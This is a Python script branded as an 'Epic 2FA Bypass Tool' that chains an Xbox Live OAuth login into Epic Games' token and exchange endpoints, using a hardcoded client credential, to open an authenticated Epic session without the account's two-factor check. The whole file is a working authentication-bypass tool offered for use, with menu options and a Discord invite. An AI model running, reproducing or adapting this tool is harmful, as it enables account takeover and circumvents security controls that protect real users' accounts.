import os
import asyncio
from urllib.parse import urlparse, parse_qs
import requests
import time
import webbrowser
from colorama import init, Fore
init(autoreset=True)
documentation_url = 'https://github.com/MixV2/EpicResearch/blob/master/docs/auth/grant_types/exchange_code.md'

def print_ascii_art():
    ascii_art = '\n    ██╗░░██╗\u2003██████╗░\u2003░█████╗░\u2003██╗░░██╗\u2003\u2003\u2003███████╗\u2003██████╗░\u2003██╗\u2003░█████╗░\u2003\u2003\u2003██████╗░\u2003███████╗\u2003░█████╗░\u2003\u2003\u2003██████╗░\u2003██╗░░░██╗\u2003██████╗░\u2003░█████╗░\u2003░██████╗\u2003░██████╗\n    ╚██╗██╔╝\u2003██╔══██╗\u2003██╔══██╗\u2003╚██╗██╔╝\u2003\u2003\u2003██╔════╝\u2003██╔══██╗\u2003██║\u2003██╔══██╗\u2003\u2003\u2003╚════██╗\u2003██╔════╝\u2003██╔══██╗\u2003\u2003\u2003██╔══██╗\u2003╚██╗░██╔╝\u2003██╔══██╗\u2003██╔══██╗\u2003██╔════╝\u2003██╔════╝\n    ░╚███╔╝░\u2003██████╦╝\u2003██║░░██║\u2003░╚███╔╝░\u2003\u2003\u2003█████╗░░\u2003██████╔╝\u2003██║\u2003██║░░╚═╝\u2003\u2003\u2003░░███╔═╝\u2003█████╗░░\u2003███████║\u2003\u2003\u2003██████╦╝\u2003░╚████╔╝░\u2003██████╔╝\u2003███████║\u2003╚█████╗░\u2003╚█████╗░\n    ░██╔██╗░\u2003██╔══██╗\u2003██║░░██║\u2003░██╔██╗░\u2003\u2003\u2003██╔══╝░░\u2003██╔═══╝░\u2003██║\u2003██║░░██╗\u2003\u2003\u2003██╔══╝░░\u2003██╔══╝░░\u2003██╔══██║\u2003\u2003\u2003██╔══██╗\u2003░░╚██╔╝░░\u2003██╔═══╝░\u2003██╔══██║\u2003░╚═══██╗\u2003░╚═══██╗\n    ██╔╝╚██╗\u2003██████╦╝\u2003╚█████╔╝\u2003██╔╝╚██╗\u2003\u2003\u2003███████╗\u2003██║░░░░░\u2003██║\u2003╚█████╔╝\u2003\u2003\u2003███████╗\u2003██║░░░░░\u2003██║░░██║\u2003\u2003\u2003██████╦╝\u2003░░░██║░░░\u2003██║░░░░░\u2003██║░░██║\u2003██████╔╝\u2003██████╔╝\n    ╚═╝░░╚═╝\u2003╚═════╝░\u2003░╚════╝░\u2003╚═╝░░╚═╝\u2003\u2003\u2003╚══════╝\u2003╚═╝░░░░░\u2003╚═╝\u2003░╚════╝░\u2003\u2003\u2003╚══════╝\u2003╚═╝░░░░░\u2003╚═╝░░╚═╝\u2003\u2003\u2003╚═════╝░\u2003░░░╚═╝░░░\u2003╚═╝░░░░░\u2003╚═╝░░╚═╝\u2003╚═════╝░\u2003╚═════╝░\n                                                      [ + ] 2FA BYPASSER V2\n                                            \n    '
    print(Fore.CYAN + ascii_art)


NEW_SWITCH_TOKEN = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
IOSTOKEN = NEW_SWITCH_TOKEN # idk why they disabled that client


def extract_code_and_exchange(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if 'code' in query_params:
        code_value = query_params['code'][0]
        exchange_url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token'
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3'}
        data = {'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': code_value}
        response = requests.post(exchange_url, headers=headers, data=data)
        if response.status_code == 200:
            access_token = response.json().get('access_token')
            return access_token
        print(f'Bad link try again : {response.status_code}')
    else:
        print('Failed try to reopen the program')

def exchange_and_getrealcode(access_token):
    exchange_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange'
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get(exchange_url, headers=headers)
    if response.status_code == 200:
        real_code = response.json().get('code')
        time.sleep(2)
        print(Fore.LIGHTCYAN_EX + '[+] Bypassing....')
        time.sleep(2)
        webbrowser.open(f'https://www.epicgames.com/id/exchange?exchangeCode={real_code}&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal%3Fmode%3Dgame&prompt=none')
        time.sleep(5)
        print(Fore.GREEN + '[+] Successfully Bypassed, If you would like to bypass another account log out of xbox.com and run the tool again!')
    else:
        print(f'Your link was either expired or not vaild {response.status_code}')
if __name__ == '__main__':
    print_ascii_art()
    print(Fore.LIGHTCYAN_EX + "[+] Welcome to Epic 2FA Bypass Tool.")
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print()
        print_ascii_art()
        print(Fore.LIGHTCYAN_EX + 'Main Menu:')
        print(Fore.LIGHTCYAN_EX + '1. 2FA Bypass')
        print(Fore.LIGHTCYAN_EX + '2. Logout of Xbox')
        print(Fore.LIGHTCYAN_EX + '3. Join the Discord')
        
        choice = input(Fore.LIGHTGREEN_EX + 'Enter your choice (1, 2 or 3): ').strip()
        if choice == '1':
            print(Fore.LIGHTCYAN_EX + '[+] Getting everything ready for bypass...')
            time.sleep(1)
            print(Fore.LIGHTCYAN_EX + '[+] Please log in on the opened tab, then copy the link and paste it into the console.')
            time.sleep(1)
            webbrowser.open('https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup')
            url = input(Fore.RED + '[+] Enter URL: ').strip()
            access_token = extract_code_and_exchange(url)
            if access_token:
                exchange_and_getrealcode(access_token)
            input('Press Enter to continue...')
        elif choice == '2':
            webbrowser.open('https://www.xbox.com/en-US/auth/msa?action=logOut&returnUrl=https%3A%2F%2Fwww.xbox.com%2Fen-US%2F&ru=https%3A%2F%2Fwww.xbox.com%2Fen-US%2F&sessionId=M.6804189699934641639')
            time.sleep(3)
            print(Fore.MAGENTA + 'Logging out!')
            time.sleep(2)
            print(Fore.LIGHTBLUE_EX + 'Successfully logged out!, Returning to main menu...')
            input('Press Enter to continue...')
        elif choice == '3':
            webbrowser.open('https://discord.gg/QeAyQGU7vU')
            time.sleep(3)
            print(Fore.CYAN + 'Thanks for support!')
            input('Press Enter to continue...')

        else:
            print('Invalid choice. Please enter 1 or 2.')
            input('Press Enter to continue...')
